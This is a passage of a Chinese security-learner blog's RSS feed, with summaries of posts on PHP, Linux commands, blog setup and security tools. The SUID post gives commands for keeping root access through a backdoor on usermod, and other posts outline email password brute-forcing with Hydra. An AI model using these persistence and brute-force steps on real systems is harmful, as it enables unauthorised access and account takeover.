      <pubDate>Sun, 22 May 2016 16:29:47 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/php-directory-and-file/</guid>
      <description>1.目录的操作 &amp;lt;?php $path = &amp;quot;/var/www/html/php/dir.php&amp;quot;; echo dirname($path).&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; //返回上级路径 echo basename($path).&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; //返回文件名部分 print_r(pathinfo($path)); //返回包含path信息的数组 echo &amp;quot;&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;&amp;quot;; //readdir()从目录句柄读取条目，返回目录中的文件名，指针依次向后移动 $path = &amp;quot;D:/phpStudy/WWW/php&amp;quot;; $dh = opendir($path); while (false !== ($filename=readdir($dh))) { echo $filename.&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; } rewinddir($dh); //指针复位 echo readdir($dh); closedir($dh); mkdir(&amp;quot;./aaa&amp;quot;);//创建文件夹aaa rmdir(&amp;quot;./aaa&amp;quot;);//删除文件夹aaa file_put_contents(&amp;quot;aa.php&amp;quot;, &amp;quot;&amp;quot;);//创建文件aa.php unlink(&amp;quot;./aa.php&amp;quot;);//删除文件aa.php ?&amp;gt;   
2.文件的读写  fopen(filename,mode)和fclose(filename,mode) 例子： &amp;lt;?php $file = fopen(&amp;quot;test.txt&amp;quot;,&amp;quot;r&amp;quot;); $file = fopen(&amp;quot;/home/test/test.txt&amp;quot;,&amp;quot;r&amp;quot;); $file = fopen(&amp;quot;/home/test/test.gif&amp;quot;,&amp;quot;wb&amp;quot;); $file = fopen(&amp;quot;http://www.example.com/&amp;quot;,&amp;quot;r&amp;quot;); $file = fopen(&amp;quot;ftp://user:password@example.</description>
    </item>
    
    <item>
      <title>PHP之字符串</title>
      <link>http://wyb0.com/posts/php-string/</link>
      <pubDate>Sat, 21 May 2016 23:16:28 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/php-string/</guid>
      <description>特点  字符串可以使用数组的处理函数操作，但并不是真正的数组 双引号中的变量用{}括起来，因为字符串中若遇到$符号，解析器会尽可能多的获取后面的字符以组成一个合法的变量名
&amp;lt;?php $lamp = array(&#39;os&#39; =&amp;gt; &#39;Linux&#39;, &#39;webserver&#39; =&amp;gt; &#39;Apache&#39;, &#39;db&#39; =&amp;gt; &#39;Mysql&#39;, &#39;language&#39; =&amp;gt; &#39;PHP&#39;); echo &amp;quot;A OS is $lamp[os].&amp;quot;; // ok echo &amp;quot;A OS is $lamp[&#39;os&#39;].&amp;quot;; // false echo &amp;quot;A OS is {$lamp[&#39;os&#39;]}.&amp;quot;; //ok echo &amp;quot;A OS is {$lamp[os]}.&amp;quot;; // ok echo &amp;quot;This square is $square-&amp;gt;width meters broad.&amp;quot;; //ok echo &amp;quot;This square is $square-&amp;gt;width meters broad.&amp;quot;; //ok echo &amp;quot;This square is $square-&amp;gt;width meters broad.&amp;quot;; //ok ?</description>
    </item>
    
    <item>
      <title>PHP之面向对象</title>
      <link>http://wyb0.com/posts/php-object-oriented/</link>
      <pubDate>Fri, 20 May 2016 16:07:55 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/php-object-oriented/</guid>
      <description>面向对象  面向对象概念  面向对象是达到了软件工程的三个目标：重用性、灵活性和扩展性，使其编程的代码更加简洁、更易于维护、并且具有更强的可重用性。  类和对象的关系  在面向对象的编程语言中，类是一个对立的程序单位，而对象的抽象就是类。类描述了一组有相同特性(属性)和相同行为(方法)的对象。开发时要先抽象类再用该类去创建对象。而我们的程序中直接使用的是对象而不是类。  什么是类  在面向对象的编程语言中，类是一个对立的程序单位，是具有相同属性和服务的一组对象的集合。它为属于该类的所有对象提供了同意的抽象描述，其内部包括成员属性和服务的方法两个部分。  什么是对象  在客观世界里，所有的事物都是由对象和对象之间的联系组成的。对象是系统中用来描述客观事物的一个实体，它是构成系统的一个基本单位，一个对象由一组属性和有权对这些属性进行操作的一组服务的封装体。   类的声明  类名和变量名还有函数名的命名规则类似，都遵循PHP中定义名称的命名规则。 若类名由多个单词组成，习惯上每个单词的首字母要大写 类中成员可分为属性和方法 属性为静态描述，方法为动态描述 在类中声明成员属性时，变量前面一定要有关键字，如：public、private、static等 若不需要有特定意义的修饰，则使用var关键字  格式： [一些修饰类的关键字] class 类名 { 类中成员; } Class Person { 成员属性： 姓名、性别、年龄、身高、体重、电话、住址等 成员方法： 说话、学习、走路、吃饭、开车、使用手机等 } 例子： &amp;lt;?php class Person { var $name; var $age; var $sex; function say() { echo &amp;quot;人在说话&amp;quot;; } function run() { echo &amp;quot;人在走路&amp;quot;; } } ?&amp;gt;  实例化对象 格式： $变量名 = new 类名称([参数列表]); $变量名 = new 类名称; 例子： &amp;lt;?</description>
    </item>
    
    <item>
      <title>PHP之数组</title>
      <link>http://wyb0.com/posts/php-array/</link>
      <pubDate>Wed, 18 May 2016 11:09:46 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/php-array/</guid>
      <description>分类  索引数组 索引值从0开始，依次递增 关联数组 以字符串为索引，键和值对是无序组合，每个键都是唯一的  数组的定义 两种方法：
 直接为数组元素赋值即可声明数组 使用array()函数声明数组
&amp;lt;?php // 1.直接为数组元素赋值即可声明数组 $contact_index[0] = 1; $contact_index[1] = &amp;quot;高某&amp;quot;; $contact_index[2] = &amp;quot;A公司&amp;quot;; $contact_index[3] = &amp;quot;北京市&amp;quot;; $contact_index[] = &amp;quot;gao@a.com&amp;quot;; var_dump($contact_index); $contact_key[&amp;quot;ID&amp;quot;] = &amp;quot;2&amp;quot;; $contact_key[&amp;quot;姓名&amp;quot;] = &amp;quot;峰某&amp;quot;; $contact_key[&amp;quot;公司&amp;quot;] = &amp;quot;B公司&amp;quot;; $contact_key[&amp;quot;邮箱&amp;quot;] = &amp;quot;feng@b.com&amp;quot;; var_dump($contact_key); // 2.使用array()函数声明数组 $contact_key_array = array( &amp;quot;ID&amp;quot; =&amp;gt; 1; &amp;quot;姓名&amp;quot; =&amp;gt; &amp;quot;峰某&amp;quot;; &amp;quot;公司&amp;quot; =&amp;gt; &amp;quot;B公司&amp;quot;; &amp;quot;邮箱&amp;quot; =&amp;gt; &amp;quot;feng@b.com&amp;quot;; ); var_dump($contact_key_array); ?&amp;gt;   数组的遍历  for语句遍历数组 foreach语句遍历数组</description>
    </item>
    
    <item>
      <title>PHP之基础</title>
      <link>http://wyb0.com/posts/php-basis/</link>
      <pubDate>Sun, 15 May 2016 09:10:23 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/php-basis/</guid>
      <description>0x00 PHP的作用  收集表单数据 生成动态网页 字符串处理 动态输出图片 处理服务器端文件系统 编写数据库支持的网页 会话跟踪控制 处理XML文件 支持大量的网络协议 服务器端的其他相关操作  0x01 PHP代码嵌入位置  可以将PHP语言嵌入到扩展名为.php的HTML文件中的任何位置，只要在文件中使用&amp;quot;&amp;lt;?php&amp;quot;起始符和终止符&amp;quot;?&amp;gt;&amp;quot;就会开启PHP模式。在PHP模式中写入PHP语句即可将PHP语言嵌入到HTML文件中。   0x02 解读开始和结束标记  1. &amp;lt;?php ?&amp;gt; 2. &amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;&amp;lt;/script&amp;gt; 3. &amp;lt;? ?&amp;gt; 4. &amp;lt;% %&amp;gt; //前两种总是可用，第3、4种要在php.ini中开启short_open_tag和asp_tags   0x03 指令分割符  php一段代码中除了最后一行不用分号，其他每句都要用分号结束，推荐每句都用分号结束
 0x04 注释  1. 若觉得代码不合适则可以注释，但不要急于删除 2. 注释的目的在于说明程序 3. 注释对调试和编写程序可以起到很好的帮助作用 4. PHP注释符有：&amp;quot;/**/&amp;quot;、&amp;quot;//&amp;quot;、&amp;quot;#&amp;quot;   0x05 空白符  空白符(空格、tab制表符、换行)会被php引擎忽略
 0x06 变量的声明  其中双引号中的变量可以被解析，单引号中的变量不能被解析
  变量名对大小写敏感 变量名开头是字母或下划线 后面跟任意数量的数字、字母、下划线 变量名中间不能有空格  0x07 可变变量  &amp;lt;?</description>
    </item>
    
    <item>
      <title>爆破邮箱</title>
      <link>http://wyb0.com/posts/blasting-email/</link>
      <pubDate>Thu, 12 May 2016 15:27:14 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/blasting-email/</guid>
      <description> 0x00 软件  使用theHarvester搜集邮箱 使用dnsenum得到邮箱服务器域名 使用nmap查看端口开启情况 使用Hydra进行弱口令猜解   0x01 设置Shadowsocks为全局模式:   0x02 得到邮箱  可在[theHarvester]下载theHarvester，得到邮箱后做成字典user.txt  0x03 得到邮箱服务器域名   0x04 nmap确认端口开启   0x05 Hydra爆密码   0x06 尝试登陆   </description>
    </item>
    
    <item>
      <title>Nessus的安装</title>
      <link>http://wyb0.com/posts/nessus-install/</link>
      <pubDate>Wed, 11 May 2016 17:09:10 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/nessus-install/</guid>
      <description> 下载Nessus的deb安装包: 去【这里】，选择家庭版，然后下载对应的安装包 本地安装nessus: 执行后续安装步骤:  启动nessus  web访问nessus服务  设置账户和密码  申请code，可以在【这里】申请  去邮箱查找code  将code填入，然后等待插件的下载   登陆Nessus: </description>
    </item>
    
    <item>
      <title>Nmap思维导图</title>
      <link>http://wyb0.com/posts/nmap-mind-mapping/</link>
      <pubDate>Tue, 10 May 2016 20:24:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/nmap-mind-mapping/</guid>
      <description> nmap思维导图如下： </description>
    </item>
    
    <item>
      <title>Windows下向github推送博客</title>
      <link>http://wyb0.com/posts/windows-push-blog-to-github/</link>
      <pubDate>Tue, 10 May 2016 15:22:20 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/windows-push-blog-to-github/</guid>
      <description> 开启本地服务   编辑md文档   推送md文档   推送html   查看推送是否成功   </description>
    </item>
    
    <item>
      <title>Windows下用github搭建博客</title>
      <link>http://wyb0.com/posts/windows-build-blog-in-github/</link>
      <pubDate>Tue, 10 May 2016 09:24:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/windows-build-blog-in-github/</guid>
      <description>首先在github上新建仓库   本地新建仓库  下载安装hugo  为hugo添加环境变量  下载安装github客户端  新建仓库  下载主题
可以在https://github.com/spf13/hugoThemes 下载你喜欢的主题
 使用主题并查看效果   本地环境配置  本地生成秘钥  在github保存秘钥  测试公钥是否添加成功  设置本地用户名和邮箱   配置config.toml  # 将reber-9全部替换为你github的账户名，另外你也可以进行一些基本的设置 baseurl = &amp;quot;http://reber-9.github.io&amp;quot; languageCode = &amp;quot;en-us&amp;quot; title = &amp;quot;reber-9&#39;s Blog&amp;quot; theme = &amp;quot;beautifulhugo&amp;quot; pygmentsUseClasses = false #disqusShortname = &amp;quot;XXX&amp;quot; #googleAnalytics = &amp;quot;XXX&amp;quot; [Params] logo = &amp;quot;img/avatar-icon.</description>
    </item>
    
    <item>
      <title>Ubuntu下向github推送博客</title>
      <link>http://wyb0.com/posts/ubuntu-push-blog-to-github/</link>
      <pubDate>Mon, 09 May 2016 23:33:12 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ubuntu-push-blog-to-github/</guid>
      <description>0x00 环境  Ubuntu14.4
 0x01 安装hugo和git 0x02 生成密钥，将密钥添加到github  $ cd ~ $ ssh-keygen -t rsa -b 2048 -C &amp;quot;123456@qq.com&amp;quot; $ cd ~/.ssh/ $ cat id_rsa.pub # 将公钥添加到 github   0x03 配置本地用户和邮箱  git config --global user.name &amp;quot;reber-9&amp;quot; git config --global user.email &amp;quot;123456@qq.com&amp;quot;   0x04 验证密钥是否添加成功  ssh -T git@github.com
 0x05 克隆远程工程  git clone https://github.com/reber-9/reber-9.com.git
 0x06 添加CNAME  cd ~/reber-9.com/
echo &amp;ldquo;reber-9.com&amp;rdquo; &amp;gt;&amp;gt; static/CNAME</description>
    </item>
    
    <item>
      <title>Ubuntu下用github搭建博客</title>
      <link>http://wyb0.com/posts/ubuntu-build-blog-in-github/</link>
      <pubDate>Mon, 09 May 2016 10:12:43 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ubuntu-build-blog-in-github/</guid>
      <description>0x00 环境  ubuntu14.04.4
 0x01 安装hugo  在https://github.com/spf13/hugo/releases 下载hugo的deb安装包
 安装hugo
reber@ubuntu:~/Downloads$ sudo dpkg -i hug_015_amd64
 生成站点
   reber@ubuntu:~/Downloads$ cd /home/reber reber@ubuntu:~$ hugo new site reber-9.com #新建站点 #启动站点,访问localhost:1313测试有没有成功 reber@ubuntu:~/reber-9.com$ hugo server -w   0x02 配置github  安装git   reber@ubuntu:~$ sudo apt-get install git reber@ubuntu:~$ git --version #查看版本判断是否安装成功    安装ssh   reber@ubuntu:~/reber-9.com$ sudo apt-get install ssh    备份并创建本地ssh
   reber@ubuntu:~/reber-9.</description>
    </item>
    
    <item>
      <title>Ubuntu下安装sublime text 3</title>
      <link>http://wyb0.com/posts/ubuntu-insatll-sublime-text3/</link>
      <pubDate>Sun, 08 May 2016 00:04:42 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ubuntu-insatll-sublime-text3/</guid>
      <description>环境： ubuntu14.4
安装  添加Sublime Text 3的仓库
sudo add-apt-repository ppa:webupd8team/sublime-text-3
 更新软件库
sudo apt-get update
 安装Sublime Text 3
sudo apt-get install sublime-text-installer
  解决不能输入中文的问题  新建sublime_imfix.c(位于～目录)，写入如下内容
#include &amp;lt;gtk/gtkimcontext.h&amp;gt; void gtk_im_context_set_client_window (GtkIMContext *context,GdkWindow *window) { GtkIMContextClass *klass; g_return_if_fail (GTK_IS_IM_CONTEXT (context)); klass = GTK_IM_CONTEXT_GET_CLASS (context); if (klass-&amp;gt;set_client_window) klass-&amp;gt;set_client_window (context, window); g_object_set_data(G_OBJECT(context),&amp;quot;window&amp;quot;,window); if(!GDK_IS_WINDOW (window)) return; int width = gdk_window_get_width(window); int height = gdk_window_get_height(window); if(width != 0 &amp;amp;&amp;amp; height !=0) gtk_im_context_focus_in(context); }  将上一步的代码编译成共享库libsublime-imfix.</description>
    </item>
    
    <item>
      <title>Ubuntu初接触(包括搭建LAMP)</title>
      <link>http://wyb0.com/posts/ubuntu-basis-set/</link>
      <pubDate>Sat, 07 May 2016 21:37:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ubuntu-basis-set/</guid>
      <description>0x00 环境  我是在虚拟机中安装14.04.4版的Ubuntu 下载Ubuntu14.04.4
 0x01 配源或选择最快的更新服务器  选择最快的更新服务器:
System Settings &amp;ndash;&amp;gt; Software &amp;amp; Updates &amp;ndash;&amp;gt; Download from:other &amp;ndash;&amp;gt; Select Best Server &amp;ndash;&amp;gt; Choose Serve &amp;ndash;&amp;gt; Close
 配源:
reber@ubuntu:~$ cp /etc/apt/sources.list /etc/apt/sources.list.bak
reber@ubuntu:~$ vim /etc/apt/sources.list
   中科大源： deb http://debian.ustc.edu.cn/ubuntu/ trusty main restricted universe multiverse deb http://debian.ustc.edu.cn/ubuntu/ trusty-security main restricted universe multiverse deb http://debian.ustc.edu.cn/ubuntu/ trusty-updates main restricted universe multiverse deb http://debian.ustc.edu.cn/ubuntu/ trusty-proposed main restricted universe multiverse deb http://debian.</description>
    </item>
    
    <item>
      <title>Git的用法</title>
      <link>http://wyb0.com/posts/git-usage/</link>
      <pubDate>Thu, 05 May 2016 10:30:32 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/git-usage/</guid>
      <description>0x00 创建仓库   0x01 克隆   0x02 仓库连接到远程服务器  # 若没有克隆现有仓库则可以连接远程仓库： git remote add origin git@github.com:reber-9/reber-9.com.git   0x03 .gitignore文件   0x04 添加和提交和推送   0x05 分支  切换分支后，分支的更改不会影响原来分支， 切换分支后，分支更改后需要add，然后commit git checkout -b test可以创建分支同时切换   0x06 更新和合并  git pull 可以同步github上的数据到本地 git merge test 可以将test分支的改动合并到当前分支   0x07 查看状态  git status   0x08 撤回  git reset HEAD # 上一次add的文件全部撤销 git log查看commit的id git reset --hard commit_id # 若未push,可回到上个commit处 git revert HEAD # 若push后,可撤销前一次 commit   0x09 多用户  如果有多个用户时可进行如下设置</description>
    </item>
    
    <item>
      <title>Linux之文本处理软件awk</title>
      <link>http://wyb0.com/posts/linux-text-processing-software-awk/</link>
      <pubDate>Wed, 20 Apr 2016 15:54:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-text-processing-software-awk/</guid>
      <description>0x00 awk  awk默认是以行为单位处理文本的，对test.txt中的每一行都执行后面 &amp;ldquo;{ }&amp;rdquo; 中的语句。
  若有一个需要重新格式化的字典test.txt(用户名、密码、地址)：
xiaosan sadasdw jiaozuo 234wer asdfasd asdas 1111 aaaa cccc 2222 aaaa degd 1111 aaaa cccc 3333 aaaa dfger 21asd sdfsd sadasd dwqx asds sasdfcv  要求：
1.里面有重复数据，使用命令去重 2.提取出用户名和密码 每一行前面加上id数字，递增。 3.只提取出密码作为爆破字典 4.某些公司都是一个公司前缀+姓名简写，所以为用户名一栏全部改为uv_用户名 5.提取出密码一列，有些密码爆破成功率高，所以增加一列，标出密码出现次数   0x01 去重  $ cat test.txt | awk &#39;!a[$1]++&#39; $ cat test.txt | uniq #作用和上面命令相同 xiaosan sadasdw jiaozuo 234wer asdfasd asdas 1111 aaaa cccc 2222 aaaa degd 3333 aaaa dfger 21asd sdfsd sadasd dwqx asds sasdfcv   0x02 去重、添加id  一般字典不需要id、user、pass等标示符，这里只是为了便于观看 $ cat test.</description>
    </item>
    
    <item>
      <title>Linux之文本处理</title>
      <link>http://wyb0.com/posts/linux-text-processing/</link>
      <pubDate>Wed, 20 Apr 2016 07:58:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-text-processing/</guid>
      <description>这里介绍3种方式：
==&amp;gt;awk ==&amp;gt;grep ==&amp;gt;sed  awk处理文本(最常用)：  作用：awk对数据以行分析并生成报告时显得很强大，它将行进行切片，再处理分开的切片，可对格式化的数据重新进行格式化
 awk命令格式：awk [F filed-separator] &amp;lsquo;commands&amp;rsquo; input-fiel(s)
 参数-F：可以添加任意的分割符，比较重要
awk工作流程是这样的：
 读入有&amp;rsquo;\n&amp;rsquo;换行符分割的一条记录，然后将记录按-F指定的域分隔符划分域，$0则表示所有域,$1表示第一个域,$n表示第n个域。默认域分隔符是&amp;rdquo;空白键&amp;rdquo; 或 &amp;ldquo;[tab]键&amp;rdquo;。  1. 入门示例： [wyb@localhost temp]$ head -n 5 /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin [wyb@localhost temp]$ head -n 5 /etc/passwd | awk -F &#39;:&#39; &#39;{print $1}&#39; //输出第1列，域分隔符为： root bin daemon adm lp [wyb@localhost temp]$ head -n 5 /etc/passwd | awk -F &#39;:&#39; &#39;{pri nt &amp;quot;id:&amp;quot;$1&amp;quot;\tshell:&amp;quot;$7}&#39; //输出第1、7列且给予列名 id:root shell:/bin/bash id:bin shell:/sbin/nologin id:daemon shell:/sbin/nologin id:adm shell:/sbin/nologin id:lp shell:/sbin/nologin [wyb@localhost temp]$ head -n 5 /etc/passwd | awk -F &#39;:&#39; &#39;BEGIN {print &amp;quot;====begin=====&amp;quot;} {print &amp;quot;id:&amp;quot;$1&amp;quot;\tshell:&amp;quot;$7} END {print &amp;quot;====end====&amp;quot;}&#39; ====begin===== id:root shell:/bin/bash id:bin shell:/sbin/nologin id:daemon shell:/sbin/nologin id:adm shell:/sbin/nologin id:lp shell:/sbin/nologin ====end==== [wyb@localhost temp]$ awk -F: &#39;/root/&#39; /etc/passwd //搜索含有root关键字的所有行 root:x:0:0:root:/root:/bin/bash operator:x:11:0:operator:/root:/sbin/nologin [wyb@localhost temp]$ awk -F: &#39;/root/{print $7}&#39; /etc/passwd //匹配root并输出对应shell /bin/bash /sbin/nologin [wyb@localhost temp]$ awk -F: &#39;/^root/&#39; /etc/passwd //匹配以root开头的行 root:x:0:0:root:/root:/bin/bash  2.</description>
    </item>
    
    <item>
      <title>Linux之tar</title>
      <link>http://wyb0.com/posts/linux-compression-software/</link>
      <pubDate>Tue, 19 Apr 2016 21:30:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-compression-software/</guid>
      <description>tar主要参数： -c 创建一个新的压缩文件 -x 解压 -t 查看压缩文件的内容 -f 指定档案文件的名字 -v 显示过程信息 -r 增加文件到指定的包 -C 指定解压后的路径 -z 使用gzip -j 使用bzip2 -Z 使用compress  tar示例： [wyb@localhost temp]$ ls aaa [wyb@localhost temp]$ tar -cvf 1.tar aaa/ *打包不压缩* aaa/ aaa/b.txt aaa/c.txt aaa/test.txt aaa/a.txt [wyb@localhost temp]$ tar -zcvf 1.tar.gz aaa/ *打包且以gzip压缩* aaa/ aaa/b.txt aaa/c.txt aaa/test.txt aaa/a.txt [wyb@localhost temp]$ tar -jcvf 1.tar.bz2 aaa/ *打包且以bzip2压缩* aaa/ aaa/b.txt aaa/c.txt aaa/test.txt aaa/a.txt [wyb@localhost temp]tar -zxvf aa.tar.gz /home/aaa --exclude=dir //排除目录 [wyb@localhost temp]$ ls -l total 24 -rw-r--r--.</description>
    </item>
    
    <item>
      <title>Linux之安装ettercap</title>
      <link>http://wyb0.com/posts/linux-install-ettercap/</link>
      <pubDate>Tue, 19 Apr 2016 20:03:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-install-ettercap/</guid>
      <description>操作系统：CentOS
首先，ettercap安装时需要4个依赖包，而且安装包里面也已经提供了
执行：sudo yum groupinstall &amp;ldquo;Development tools&amp;rdquo; 源码安装软件就需要安装这个
 一、下载解压  可用wget下载
 二、查看需要的依赖项  [wyb@localhost ettercap-0.8.2]$ vim INSTALL #### Bundled libraries Ettercap now bundles the following libraries with the source distribution: libnet 1.1.6 curl 7.41.0 luajit 2.0.3 check 0.9.14 [wyb@localhost ettercap-0.8.2]$ cd bundled_deps/ [wyb@localhost bundled_deps]$ ls check curl libnet luajit   三、安装依赖包  安装check
[wyb@localhost check]$ cd check-0.9.14 [wyb@localhost check-0.9.14]$ ls [wyb@localhost check-0.9.14]$ ./configure [wyb@localhost check-0.9.14]$ make [wyb@localhost check-0.</description>
    </item>
    
    <item>
      <title>Linux之软件的安装</title>
      <link>http://wyb0.com/posts/linux-software-installation/</link>
      <pubDate>Tue, 19 Apr 2016 19:07:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-software-installation/</guid>
      <description>Linux上的软件安装可以分为三种方式： 1. yum安装 yum基于RPM包管理，一次性安装所有依赖包，提供了查找、安装、删除一个、一组 至全部软件包的命令，配置文件在/etc/yum.repos.d/下 主要命令： yum install gcc g++ yum remove wget yum list installed //显示已经安装过的软件 yum list //显示所有可以安装的包  
[wyb@localhost ~]$ wget -h //验证有没有安装wget -bash: /usr/bin/wget: No such file or directory [wyb@localhost ~]$ sudo yum search wget //通过yum查找wget，看有没有这个软件包 Loaded plugins: fastestmirror, refresh-packagekit, security Loading mirror speeds from cached hostfile * base: mirrors.yun-idc.com * extras: mirrors.pubyun.com * updates: mirrors.yun-idc.com ============================== N/S Matched: wget =============================== wget.x86_64 : A utility for retrieving files using the HTTP or FTP protocols Name and summary matches only, use &amp;quot;search all&amp;quot; for everything.</description>
    </item>
    
    <item>
      <title>Linux之基础命令</title>
      <link>http://wyb0.com/posts/linux-basic-command/</link>
      <pubDate>Tue, 19 Apr 2016 10:03:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-basic-command/</guid>
      <description>0x00 ls：显示文件  [wyb@localhost tmp]$ ls a a.txt [wyb@localhost tmp]$ ls -l total 4 drwxr-xr-x. 2 wyb root 4096 Apr 17 18:23 a -rw-r--r--. 1 wyb root 0 Apr 17 18:23 a.txt [wyb@localhost tmp]$ ls -a . .. a a.txt .esd-500 .ICE-unix [wyb@localhost tmp]$ ls -al total 20 drwxrwxrwt. 5 root root 4096 Apr 17 18:23 . dr-xr-xr-x. 22 root root 4096 Apr 17 16:31 .. drwxr-xr-x. 2 wyb root 4096 Apr 17 18:23 a -rw-r--r--.</description>
    </item>
    
    <item>
      <title>Linux之服务和计划任务</title>
      <link>http://wyb0.com/posts/linux-service-and-planning-tasks/</link>
      <pubDate>Tue, 19 Apr 2016 10:03:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-service-and-planning-tasks/</guid>
      <description>服务： 在后台运行的软件就叫服务 参数： start stop restart
apache启动后默认降权
service httpd start实际调用的是/etc/init.d/httpd这个shell脚本 而/etc/init.d是软连接文件夹，实际在/etc/rc.d/init.d [wyb@localhost ~]$ ls -al /etc/init.d lrwxrwxrwx. 1 root root 11 Apr 11 02:54 /etc/init.d -&amp;gt; rc.d/init.d  添加服务： 将脚本放在/etc/init.d/下即可  若要自启则： chkconfig --list //查看chk管理的自启动项 chkconfig --add httpd 添加到chk管理里面 chkconfig --del httpd 将httpd移出chk管理 chkcofnig --level 35 httpd on init的345将开启 chkcofnig --level 345 httpd off /etc/rc.d/rc3.d和rc5.d里将有httpd  计划任务： 启动方式： 系统启动时将有一个脚本将cron服务开启，启动后cron命令会搜索全局型配置文件/etc/crontab和位于/var/spool/corn目录下以用户名命名的文件
cron：每分钟醒来依次查看当前是否有需要运行的命令，最小单位就是分钟
添加任务： 格式：分(0-59) 时 日 月 周(0-6) 命令
第一种方法： crontab -e //任何权限都可以运行这个命令，针对某个用户 [wyb@localhost spool]$ crontab -e //进入编辑，实际是写入到/var/spool/cron/username这个文件中 no crontab for wyb - using an empty one */1 * * * * date &amp;gt;&amp;gt; /tmp/date.</description>
    </item>
    
    <item>
      <title>Linux之SUID后门</title>
      <link>http://wyb0.com/posts/linux-suid-back-door/</link>
      <pubDate>Mon, 18 Apr 2016 20:03:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-suid-back-door/</guid>
      <description>SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制：
为二进制文件添加s权限从而提升为root权限方法：  写sudoers添加用户 //最佳方案
 vim /etc/passwd //将uid和gid改为0 vim /etc/shadow //密文覆盖
 vim root .ssh/证书文件 .ssh这个文件夹和证书的权限要正确，要和原来一致  SUID:这个东西主要是留后门 在root权限下给usermod一个s权限： # which usermod //得到usermod的路径 /usr/sbin/usermod # chmod u+s /usr/sbin/usermod # ls -l /usr/sbin/usermod -rwsr-x---. 1 root root 98680 Dec 7 2011 /usr/sbin/usermod  usermod给其他人一个x权限： [root@localhost ~]# chmod o+x /usr/sbin/usermod [root@localhost ~]# ls -l /usr/sbin/usermod -rwsr-x--x. 1 root root 98680 Dec 7 2011 /usr/sbin/usermod  切换到普通用户wyb：  [wyb@localhost ~]$ id wyb uid=500(wyb) gid=500(wyb) groups=500(wyb) [wyb@localhost ~]$ usermod -g root wyb [wyb@localhost ~]$ id wyb uid=500(wyb) gid=0(root) groups=0(root) [wyb@localhost ~]$ exit  验证： 重新用wyb连接，此时即为root权限 [wyb@localhost ~]$ cd /root //若能切换到此目录即证明确实获得了root权限 [wyb@localhost root]$ ls anaconda-ks.</description>
    </item>
    
    <item>
      <title>Linux之用户和用户组</title>
      <link>http://wyb0.com/posts/linux-user/</link>
      <pubDate>Sun, 17 Apr 2016 20:48:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-user/</guid>
      <description> 0x01 新建用户  环境：Ubuntu 14.04.4
  Step1：添加新用户
useradd -r -m -s /bin/bash 用户名
 Step2:配置新用户密码
passwd 用户名
 Step3：给新添加的用户增加root权限
visudo
然后添加：
用户名 ALL=(ALL:ALL) ALL
 ctrl+o 保存 ctrl+x 退出
  0x01 用户组  初始组只有一个就是/etc/passwd里gid显示的，有效组可以有多个  useradd xm 用户xm会默认加到xm组 useradd -g fans xm 将xm的所属组改为fans useradd -G fans xm 初始组为xm，有效组为fans  useradd xiaoming usermod -g fans xiaoming 只有一个初始组，被修改为fans useradd xm usermod -G fans xm xm用户会有两个组，初始组为xm，又添加一个有效组fans usermod -G fans1 xm xm用户两个组，初始组为xm，有效组更改为fans1  用户创建的文件拥有者是初始组   </description>
    </item>
    
    <item>
      <title>Linux之网络配置</title>
      <link>http://wyb0.com/posts/linux-network-configuration/</link>
      <pubDate>Sun, 17 Apr 2016 17:58:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-network-configuration/</guid>
      <description> 第一种方法 分5步： 1. 启动网卡： $ ifconfig eth0 up/down 2. 配置ip： $ ifconfig eth0 192.168.22.231 netmask 255.255.255.0 3. 配置网关： $ route add default gw 192.168.22.1 4. 配DNS： $ vim /etc/resolv.conf $ echo &amp;quot;nameserver 114.114.114.114&amp;quot; &amp;gt; /etc/resolv.cof 5. 重启网络使配置生效： 6. 用文件配置ip信息 $ /etc/sysconfig/network-scripts/ifcfg-eth0 ps:添加静态路由 route add -net 10.211.55.0 netmask 255.255.255.0 dev eth3 //添加静态路由添加网络10.211.55.0，从eth0出去  第二种方法 分1步： 打开文件/etc/sysconfig/network-scripts/ifcfg-eth0,在里面添加相应信息:
DEVICE=ethl ONBOOT=yes BOOTPROTO=static IPADDR= NETMASK= GATEWAY=  打开ip转发 echo &amp;quot;1&amp;quot; &amp;gt;&amp;gt; /proc/sys/net/ipv4/ip_forward 或者vim /etc/sysctl.conf  </description>
    </item>
    
    <item>
      <title>[转]短</title>
      <link>http://wyb0.com/posts/short/</link>
      <pubDate>Sun, 17 Apr 2016 15:49:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/short/</guid>
      <description>短 俄罗斯某诗人


一天很短 短得来不及拥抱清晨 就已经手握黄昏 
一年很短 短得来不及细品初春殷红窦绿 就要打点素裹秋霜 
一生很短 短的来不及享用美好年华 就已经身处迟暮 
